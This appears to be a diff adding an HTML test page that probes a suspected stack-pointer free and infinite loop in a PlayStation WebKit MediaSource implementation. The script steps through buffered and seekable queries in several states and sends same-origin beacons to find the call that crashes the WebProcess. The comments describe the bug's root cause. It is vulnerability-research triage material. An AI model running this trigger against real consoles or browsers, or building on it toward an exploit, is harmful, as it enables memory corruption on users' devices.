@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>msbuf</title></head>
+<body><video id="v" muted></video><script>
+// Wild-free probe: MediaSourcePrivatePlayStation::buffered() returns
+//   std::unique_ptr<mediaplayer::TimeRanges>(&timeRanges)
+// where timeRanges is a STACK local (shipped source, line ~179). Any consumer
+// that owns and destroys that pointer frees a stack address.
+// The same function's loop condition is `m_client->buffered().length()` with no
+// index bound, i.e. an infinite loop as soon as one range exists.
+// Each step beacons first, so a WebProcess death identifies the call.
+
+function beacon(tag) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(tag) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+function step(name, fn) {
+  beacon('MS-BEFORE ' + name);
+  try {
+    var r = fn();
+    beacon('MS-AFTER ' + name + ' r=' + r);
+    return r;
+  } catch (e) {
+    beacon('MS-EXC ' + name + ' ' + (e && e.name));
+    return null;
+  }
+}
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function once(el, ev, ms) {
+  return new Promise(function(res) {
+    var done = false;
+    function fin(w) { if (!done) { done = true; res(w); } }
+    el.addEventListener(ev, function() { fin(ev); }, { once: true });
+    setTimeout(function() { fin('timeout'); }, ms);
+  });
+}
+
+async function run() {
+  beacon('MS-START');
+  var v = document.getElementById('v');
+  var ms = new MediaSource();
+  var url = URL.createObjectURL(ms);
+  v.src = url;
+
+  await once(ms, 'sourceopen', 3000);
+  beacon('MS-OPEN readyState=' + ms.readyState);
+
+  // A: query buffered/seekable with no source buffer at all
+  step('A-buffered-empty', function() { return v.buffered.length; });
+  step('A-seekable-empty', function() { return v.seekable.length; });
+
+  var sb = null;
+  var mime = 'video/mp4; codecs="avc1.42E01E"';
+  try {
+    sb = ms.addSourceBuffer(mime);
+    beacon('MS-SB added');
+  } catch (e) {
+    beacon('MS-SB exc ' + (e && e.name));
+  }
+
+  if (sb) {
+    // B: query buffered with a source buffer but nothing buffered
+    step('B-buffered-noappend', function() { return v.buffered.length; });
+    step('B-seekable-noappend', function() { return v.seekable.length; });
+
+    // C: play, then poll buffered while playing
+    v.play().catch(function() {});
+    await sleep(200);
+    step('C-buffered-playing', function() { return v.buffered.length; });
+    step('C-currentTime', function() { return Math.round(v.currentTime * 1000); });
+
+    // D: append a tiny garbage segment, then query again
+    try {
+      sb.appendBuffer(new Uint8Array([0, 0, 0, 8, 0x66, 0x74, 0x79, 0x70]));
+      beacon('MS-APPEND issued');
+    } catch (e) {
+      beacon('MS-APPEND exc ' + (e && e.name));
+    }
+    await sleep(400);
+    step('D-buffered-after-append', function() { return v.buffered.length; });
+
+    // E: endOfStream then query
+    try { ms.endOfStream(); beacon('MS-EOS issued'); } catch (e) { beacon('MS-EOS exc ' + (e && e.name)); }
+    await sleep(200);
+    step('E-buffered-after-eos', function() { return v.buffered.length; });
+
+    // F: remove the source buffer, then query
+    try { ms.removeSourceBuffer(sb); beacon('MS-RM issued'); } catch (e) { beacon('MS-RM exc ' + (e && e.name)); }
+    await sleep(200);
+    step('F-buffered-after-remove', function() { return v.buffered.length; });
+  }
+
+  // G: tear the element down and load again, then query
+  step('G-load', function() { v.load(); return 1; });
+  await sleep(200);
+  step('G-buffered-after-load', function() { return v.buffered.length; });
+
+  beacon('MS-DONE');
+  setTimeout(function() { location.reload(); }, 800);
+}
+
+run().catch(function(e) { beacon('MS-FATAL ' + (e && e.name)); });
+</script></body></html>
